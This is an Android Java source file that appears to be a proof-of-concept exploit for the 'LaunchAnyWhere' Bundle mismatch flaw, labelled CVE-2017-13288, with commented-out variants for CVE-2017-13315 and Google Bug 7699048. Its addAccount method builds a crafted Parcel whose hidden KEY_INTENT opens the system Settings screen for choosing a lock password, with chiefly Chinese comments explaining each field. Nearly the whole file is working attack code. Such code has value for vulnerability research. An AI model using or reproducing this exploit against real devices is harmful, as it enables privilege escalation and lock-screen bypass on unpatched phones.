package com.example.launchanywherebyevilparcel1999;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

public class MyAuthenticator extends AbstractAccountAuthenticator {
    public static final String TAG="MyAuthenticator";

    private Context mContext;

    public MyAuthenticator(Context context) {
        super(context);
        mContext=context;
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse accountAuthenticatorResponse, String s) {
        return null;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse accountAuthenticatorResponse, String s, String s1, String[] strings, Bundle bundle) throws NetworkErrorException {
        Log.v(TAG,"addAccount");

        /*
        CVE-2017-13288
        */

        Bundle evil=new Bundle();
        Parcel bndlData=Parcel.obtain();
        Parcel pcelData=Parcel.obtain();
        pcelData.writeInt(2);  // 键值对的数量：2
        // 写入第一个键值对
        pcelData.writeString("mismatch");
        pcelData.writeInt(4);  // VAL_PARCELABLE
        pcelData.writeString("android.bluetooth.le.PeriodicAdvertisingReport"); // Class Loader
        pcelData.writeInt(1);  // syncHandle
        pcelData.writeInt(1);  // txPower
        pcelData.writeInt(1);  // rssi
        pcelData.writeInt(1);  // dataStatus
        pcelData.writeInt(1);  // flag
        pcelData.writeInt(-1); // 恶意KEY_INTENT的长度，暂时写入-1

        int keyIntentStartPos=pcelData.dataPosition(); // KEY_INTENT的起始位置
        pcelData.writeString(AccountManager.KEY_INTENT);
        pcelData.writeInt(4);  // VAL_PARCELABLE
        pcelData.writeString("android.content.Intent");  // Class Loader
        pcelData.writeString(Intent.ACTION_RUN);  // Intent Action
        Uri.writeToParcel(pcelData,null);  // uri = null
        pcelData.writeString(null);  // mType = null
        pcelData.writeInt(0x10000000);  // Flags
        pcelData.writeString(null);  // mPackage = null
        pcelData.writeString("com.android.settings");
        pcelData.writeString("com.android.settings.password.ChooseLockPassword");
        pcelData.writeInt(0);  // mSourceBounds = null
        pcelData.writeInt(0);  // mCategories = null
        pcelData.writeInt(0);  // mSelector = null
        pcelData.writeInt(0);  // mClipData = null
        pcelData.writeInt(-2); // mContentUserHint
        pcelData.writeBundle(null);

        int keyIntentEndPos=pcelData.dataPosition(); // KEY_INTENT的终止位置
        int lengthOfKeyIntent=keyIntentEndPos-keyIntentStartPos; // 计算KEY_INTENT的长度
        pcelData.setDataPosition(keyIntentStartPos-4);  // 将指针移到KEY_INTENT长度处
        pcelData.writeInt(lengthOfKeyIntent);  // 写入KEY_INTENT的长度
        pcelData.setDataPosition(keyIntentEndPos);
        Log.d(TAG, "Length of KEY_INTENT is 0x" + Integer.toHexString(lengthOfKeyIntent)); // 0x144
        // 写入第二个键值对
        pcelData.writeString("Padding-Key");
        pcelData.writeInt(0);  // VAL_STRING
        pcelData.writeString("Padding-Value");
        int length = pcelData.dataSize();
        Log.d(TAG,"length = "+length);
        bndlData.writeInt(length);
        bndlData.writeInt(0x4c444e42);  // Bundle魔数
        bndlData.appendFrom(pcelData,0,length);
        bndlData.setDataPosition(0);
        evil.readFromParcel(bndlData);
        Log.d(TAG,evil.toString());
        return evil;


        /*
        CVE-2017-13315
        */
/*
        Bundle evil=new Bundle();
        Parcel bndlData = Parcel.obtain();
        Parcel pcelData = Parcel.obtain();

        pcelData.writeInt(3); // 键值对的数量：3
        // 写入第一个键值对
        pcelData.writeString("mismatch");
        pcelData.writeInt(4);  // VAL_PACELABLE
        pcelData.writeString("com.android.internal.telephony.DcParamObject"); // Class Loader
        pcelData.writeInt(1);  //mSubId

        // 写入第二个键值对
        pcelData.writeInt(1);
        pcelData.writeInt(6);
        pcelData.writeInt(13); // VAL_BYTEARRAY
        //pcelData.writeInt(0x144); //KEY_INTENT:intent的长度
        pcelData.writeInt(-1); // KEY_INTENT的长度，暂时写入-1，后续再进行修改
        int keyIntentStartPos = pcelData.dataPosition(); // KEY_INTENT的起始位置
        // 恶意Intent隐藏在byte数组中
        pcelData.writeString(AccountManager.KEY_INTENT);
        pcelData.writeInt(4);
        pcelData.writeString("android.content.Intent");// Class Loader
        pcelData.writeString(Intent.ACTION_RUN); // Intent Action
        Uri.writeToParcel(pcelData, null); // Uri = null
        pcelData.writeString(null); // mType = null
        pcelData.writeInt(0x10000000); // Flags
        pcelData.writeString(null); // mPackage = null
        pcelData.writeString("com.android.settings");
        pcelData.writeString("com.android.settings.password.ChooseLockPassword");
        pcelData.writeInt(0); //mSourceBounds = null
        pcelData.writeInt(0); // mCategories = null
        pcelData.writeInt(0); // mSelector = null
        pcelData.writeInt(0); // mClipData = null
        pcelData.writeInt(-2); // mContentUserHint
        pcelData.writeBundle(null);

        int keyIntentEndPos = pcelData.dataPosition(); // KEY_INTENT的终止位置
        int lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos; // 计算KEY_INTENT的长度
        pcelData.setDataPosition(keyIntentStartPos - 4);  // 将指针移到KEY_INTENT长度处
        pcelData.writeInt(lengthOfKeyIntent);  // 写入KEY_INTENT的长度
        pcelData.setDataPosition(keyIntentEndPos);
        Log.d(TAG, "Length of KEY_INTENT is 0x" + Integer.toHexString(lengthOfKeyIntent));

        // 写入第三个键值对
        pcelData.writeString("Padding-Key");
        pcelData.writeInt(0); // VAL_STRING
        pcelData.writeString("Padding-Value"); //


        int length  = pcelData.dataSize();
        Log.d(TAG, "length is " + Integer.toHexString(length));
        bndlData.writeInt(length);
        bndlData.writeInt(0x4c444E42);
        bndlData.appendFrom(pcelData, 0, length);
        bndlData.setDataPosition(0);
        evil.readFromParcel(bndlData);
        Log.d(TAG, evil.toString());
        return evil;

*/
        /*Google Bug 7699048*/

/*
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
                "com.android.settings",
                "com.android.settings.ChooseLockPassword"));
        intent.setAction(Intent.ACTION_RUN);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("confirm_credentials",false);
        final Bundle evil = new Bundle();
        bundle.putParcelable(AccountManager.KEY_INTENT, intent);
        return evil;
*/

/*
        Parcel bndlData = Parcel.obtain();
        Parcel pcelData = Parcel.obtain();

        pcelData.writeString(AccountManager.KEY_INTENT);
        pcelData.writeInt(4);
        pcelData.writeString("android.content.Intent");// Class Loader
        pcelData.writeString(Intent.ACTION_RUN); // Intent Action
        Uri.writeToParcel(pcelData, null); // Uri = null
        pcelData.writeString(null); // mType = null
        pcelData.writeInt(0x10000000); // Flags
        pcelData.writeString(null); // mPackage = null
        pcelData.writeString("com.android.settings");
        pcelData.writeString("com.android.settings.password.ChooseLockPassword");
        pcelData.writeInt(0); //mSourceBounds = null
        pcelData.writeInt(0); // mCategories = null
        pcelData.writeInt(0); // mSelector = null
        pcelData.writeInt(0); // mClipData = null
        pcelData.writeInt(-2); // mContentUserHint
        pcelData.writeBundle(null);
        int length = pcelData.dataSize();

        Log.d(TAG,"length = "+length);
        bndlData.writeInt(length);
        bndlData.writeInt(0x4c444e42);  // Bundle魔数
        bndlData.appendFrom(pcelData,0,length);
        bndlData.setDataPosition(0);

        final Bundle evil = new Bundle();
        evil.readFromParcel(bndlData);

        return evil;
*/
    }

    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String s, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public String getAuthTokenLabel(String s) {
        return null;
    }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String s, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String[] strings) throws NetworkErrorException {
        return null;
    }
}